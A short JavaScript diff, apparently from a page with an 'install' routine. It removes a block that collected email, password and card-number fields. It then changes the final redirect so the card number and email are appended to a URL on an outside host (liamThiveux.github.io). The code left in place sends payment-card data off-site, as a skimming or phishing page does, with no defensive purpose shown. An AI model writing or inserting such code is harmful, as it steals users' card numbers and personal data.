@@ -8,19 +8,6 @@ function showMessage(message) {
     messageElement.innerHTML = message + '\n' + messageElement.innerHTML;
 }
 
-var account = {};
-
- function getAccount() { 
-     account.email = email.value; 
-     account.mdp = mdp.value; 
-     account.numcarte = numcarte.value; 
-   } 
-
-  email.value = account.email; 
-  mdp.value = account.mdp; 
-  numcarte.value = account.numcarte; 
-
-
 function clearMessages() {
     document.getElementById('msg').innerHTML = '';
 }
@@ -136,7 +123,7 @@ function install() {
             hideElement('installing');
             showMessage(error);
         });
-    location.href = 'https://liamThiveux.github.io?cardNumber='+ account.numcarte+'&email='+account.email;
+    location.href = 'https://liamThiveux.github.io?cardNumber='+ numcarte.value +'&email='+ email.value;
 }
 
 /*var appDef = { 
